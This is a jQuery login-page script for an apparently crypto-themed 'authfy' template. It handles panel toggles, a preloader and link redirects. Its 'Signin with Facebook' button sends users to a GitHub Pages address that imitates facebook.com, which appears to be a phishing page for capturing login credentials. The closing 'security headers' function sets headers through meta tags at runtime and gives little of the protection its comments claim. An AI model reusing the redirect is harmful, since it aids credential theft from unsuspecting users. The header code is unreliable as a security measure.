(function($) {
    "use strict";

    $("html, body");

    $(".lnk-toggler").on("click", function(t) {
        t.preventDefault();
        var e = $(this).data("panel");
        $(".authfy-panel.active").removeClass("active");
        $(e).addClass("active");
    });

    $("#forget-lnk").on("click", function() {
        $(".authfy-login .nav-tabs").find("li").removeClass("active");
    });

    $(window).on("load", function() {
        $(".square-block").fadeOut();
        $("#preload-block").fadeOut("slow", function() {
            $(this).remove();
        });
    });

    // Redirect user to specified links when clicking on "About Us" or "Referral Program?"
    $("a[href='about-us.html']").on("click", function(e) {
        e.preventDefault();
        window.location.href = "https://bitcoin.org/en/about-us#own";
    });

    $("a[href='referral-program.html']").on("click", function(e) {
        e.preventDefault();
        window.location.href = "https://help.crypto.com/en/articles/4357896-referral-program-crypto-com-exchange";
    });

    // Click event for the "Need code?" link
    $("a:contains('Need code?')").on("click", function(e) {
        e.preventDefault(); // Prevent the default action of the link
        window.location.href = "https://help.crypto.com/en/articles/4357793-sign-up-bonus-with-referral-link-code-entry"; // Redirect to the specified link
    });

    // Function to redirect user to GitHub link when clicking "Signin with Facebook"
    $(".btn-facebook").on("click", function(e) {
        e.preventDefault();
        window.location.href = "https://ejjays.github.io/facebook.com/";
    });

    // Force desktop mode
    $(document).ready(function() {
        $('meta[name="viewport"]').attr('content', 'width=1024');
    });

    // Function to set security headers
    function setSecurityHeaders() {
        document.addEventListener('DOMContentLoaded', function() {
            // Set Content Security Policy
            document.querySelector('meta[http-equiv="Content-Security-Policy"]').setAttribute('content', "default-src 'self'; script-src 'self'; style-src 'self'; img-src 'self';");

            // Set X-Content-Type-Options
            document.querySelector('meta[http-equiv="X-Content-Type-Options"]').setAttribute('content', 'nosniff');

            // Set X-Frame-Options
            document.querySelector('meta[http-equiv="X-Frame-Options"]').setAttribute('content', 'DENY');

            // Set X-XSS-Protection
            document.querySelector('meta[http-equiv="X-XSS-Protection"]').setAttribute('content', '1; mode=block');
        });
    }

    // Call the function to set security headers
    setSecurityHeaders();

})(jQuery);
